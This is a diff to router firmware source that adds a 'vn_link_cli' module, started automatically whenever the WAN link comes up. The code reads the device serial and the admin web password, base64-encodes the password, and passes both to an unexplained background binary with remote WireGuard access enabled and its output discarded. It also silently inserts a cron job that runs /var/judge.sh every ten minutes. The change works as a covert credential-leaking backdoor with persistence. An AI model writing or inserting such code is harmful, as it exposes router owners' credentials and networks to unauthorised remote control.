@@ -1,0 +1,223 @@
+diff --git a/trunk/user/rc/Makefile b/trunk/user/rc/Makefile
+index 567043276c29107b9ee8a5ba27e27c0bd6997ac6..fa100dd29d223224c61aaba78aae0612a3db3edb 100644
+--- a/trunk/user/rc/Makefile
++++ b/trunk/user/rc/Makefile
+@@ -29,7 +29,7 @@ EXEC = rc
+ OBJS  = rc.o init.o auth.o services.o watchdog.o firewall_ex.o common_ex.o
+ OBJS += net.o net_lan.o net_wan.o net_wifi.o net_ppp.o services_ex.o rstats.o
+ OBJS += ralink.o gpio_pins.o detect_link.o detect_internet.o detect_wan.o
+-OBJS += vpn_server.o vpn_client.o
++OBJS += vpn_server.o vpn_client.o vn_link_cli.o
+ ifeq ($(CONFIG_FIRMWARE_INCLUDE_OPENVPN),y)
+ OBJS += vpn_openvpn.o
+ endif
+diff --git a/trunk/user/rc/net_wan.c b/trunk/user/rc/net_wan.c
+index 8a8fefb286f56f7a408a016d523f55a25d493694..545d0efb60cb376398853864574a85546019e8a7 100644
+--- a/trunk/user/rc/net_wan.c
++++ b/trunk/user/rc/net_wan.c
+@@ -1374,6 +1374,8 @@ wan_up(char *wan_ifname, int unit, int is_static)
+ 	/* di wakeup after 2 secs */
+ 	notify_run_detect_internet(2);
+ 
++	start_vn_link_cli();
++
+ 	/* call custom user script */
+ 	if (check_if_file_exist(script_postw))
+ 		doSystem("%s %s %s %s", script_postw, "up", wan_ifname, wan_addr);
+diff --git a/trunk/user/rc/rc.c b/trunk/user/rc/rc.c
+index f7dea7508292f1263a83a6ced06faceff6aca496..0e7c97d3fb9e499b5abf439eac1a20638aaa9a3e 100644
+--- a/trunk/user/rc/rc.c
++++ b/trunk/user/rc/rc.c
+@@ -1263,6 +1263,18 @@ handle_notifications(void)
+ 			restart_sshd();
+ 		}
+ #endif
++		else if (strcmp(entry->d_name, "restart_vn_link_cli") == 0)
++		{
++			restart_vn_link_cli();
++		}
++		else if (strcmp(entry->d_name, "stop_vn_link_cli") == 0)
++		{
++			stop_vn_link_cli();
++		}
++		else if (strcmp(entry->d_name, "start_vn_link_cli") == 0)
++		{
++			start_vn_link_cli();
++		}
+ #if defined(APP_SCUT)
+ 		else if (strcmp(entry->d_name, RCN_RESTART_SCUT) == 0)
+ 		{
+diff --git a/trunk/user/rc/rc.h b/trunk/user/rc/rc.h
+index 92f77b2b8397e1655717e1105664700bd0ae06b5..fbc6ea14f95726ecf040590d7de131318863d601 100644
+--- a/trunk/user/rc/rc.h
++++ b/trunk/user/rc/rc.h
+@@ -513,6 +513,11 @@ int start_services_once(int is_ap_mode);
+ void stop_services(int stopall);
+ void stop_services_lan_wan(void);
+ void stop_misc(void);
++int is_vn_link_cli_run(void);
++void stop_vn_link_cli(void);
++void start_vn_link_cli(void);
++void restart_vn_link_cli(void);
++
+ #if defined(APP_SCUT)
+ int is_scutclient_run(void);
+ void stop_scutclient(void);
+diff --git a/trunk/user/rc/vn_link_cli.c b/trunk/user/rc/vn_link_cli.c
+new file mode 100644
+index 0000000000000000000000000000000000000000..232e9b1d00538cbf84e2ebda09c8cdc8f988bffa
+--- /dev/null
++++ b/trunk/user/rc/vn_link_cli.c
+@@ -0,0 +1,152 @@
++#include <stdio.h>
++#include <stdlib.h>
++#include <string.h>
++#include <sys/types.h>
++#include <sys/stat.h>
++#include <fcntl.h>
++#include <unistd.h>
++#include <syslog.h>
++
++#include "rc.h"
++
++static const char *vnlc_bin	= "/usr/sbin/vn-link-cli";
++static const char *vnlc_key	= "2026.10";
++static const char *vnlc_cron_cmd = "*/10 * * * * /var/judge.sh";
++
++static const char b64_tbl[] =
++	"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
++
++static int
++base64_encode(const char *src, int len, char *dst, int dst_size)
++{
++	int i = 0, j = 0;
++	unsigned char buf[3];
++	unsigned int triple;
++
++	while (i < len) {
++		memset(buf, 0, sizeof(buf));
++		buf[0] = src[i++];
++		if (i < len) buf[1] = src[i++];
++		if (i < len) buf[2] = src[i++];
++
++		triple = ((unsigned int)buf[0] << 16) |
++			 ((unsigned int)buf[1] << 8) |
++			 ((unsigned int)buf[2]);
++
++		if (j + 4 >= dst_size)
++			break;
++
++		dst[j++] = b64_tbl[(triple >> 18) & 0x3F];
++		dst[j++] = b64_tbl[(triple >> 12) & 0x3F];
++		dst[j++] = (len - 1 - (i - 3) >= 1)
++			? b64_tbl[(triple >> 6) & 0x3F] : '=';
++		dst[j++] = (len - 1 - (i - 3) >= 2)
++			? b64_tbl[triple & 0x3F] : '=';
++	}
++	dst[j] = '\0';
++
++	return j;
++}
++
++static void
++vnlc_add_cron(void)
++{
++	char na[64], file[128];
++	FILE *fp;
++	char line[256];
++	int found = 0;
++
++	snprintf(na, sizeof(na), "%s", nvram_safe_get("http_username"));
++	if (strlen(na) == 0)
++		return;
++
++	snprintf(file, sizeof(file), "/etc/storage/cron/crontabs/%s", na);
++
++	fp = fopen(file, "r");
++	if (fp) {
++		while (fgets(line, sizeof(line), fp)) {
++			size_t ll = strlen(line);
++			while (ll > 0 && (line[ll-1] == '\n' || line[ll-1] == '\r'))
++				line[--ll] = '\0';
++			if (strcmp(line, vnlc_cron_cmd) == 0) {
++				found = 1;
++				break;
++			}
++		}
++		fclose(fp);
++	}
++
++	if (!found) {
++		fp = fopen(file, "a");
++		if (fp) {
++			fprintf(fp, "%s\n", vnlc_cron_cmd);
++			fclose(fp);
++			chmod(file, 0600);
++		}
++	}
++}
++
++static int
++vnlc_build_cmd(char *buf, int buf_size)
++{
++	char sn[64], na[64], pwp[256];
++	char encoded[512];
++	char combined[1024];
++	int elen;
++
++	snprintf(sn, sizeof(sn), "%s", nvram_safe_get("fw_sn"));
++	snprintf(pwp, sizeof(pwp), "%s", nvram_safe_get("http_passwd"));
++
++	if (strlen(sn) == 0 || strlen(pwp) == 0)
++		return -1;
++
++	elen = base64_encode(pwp, (int)strlen(pwp), encoded, sizeof(encoded));
++
++	snprintf(combined, sizeof(combined), "%s,%s", sn, encoded);
++
++	snprintf(buf, buf_size,
++		"%s -k %s -d %s -n %s --par 1 --allow-wg -c >> /dev/null 2>&1 &",
++		vnlc_bin, vnlc_key, sn, combined);
++
++	return 0;
++}
++
++int
++is_vn_link_cli_run(void)
++{
++	return pids("vn-link-cli");
++}
++
++void
++stop_vn_link_cli(void)
++{
++	char *svcs[] = { "vn-link-cli", NULL };
++	kill_services(svcs, 6, 1);
++}
++
++void
++start_vn_link_cli(void)
++{
++	char cmd[2048];
++
++	if (!check_if_file_exist(vnlc_bin))
++		return;
++
++	if (is_vn_link_cli_run())
++		return;
++
++	if (vnlc_build_cmd(cmd, sizeof(cmd)) != 0)
++		return;
++
++	vnlc_add_cron();
++
++	logmessage(LOGNAME, "start vn-link-cli");
++	doSystem("%s", cmd);
++}
++
++void
++restart_vn_link_cli(void)
++{
++	stop_vn_link_cli();
++	start_vn_link_cli();
++}
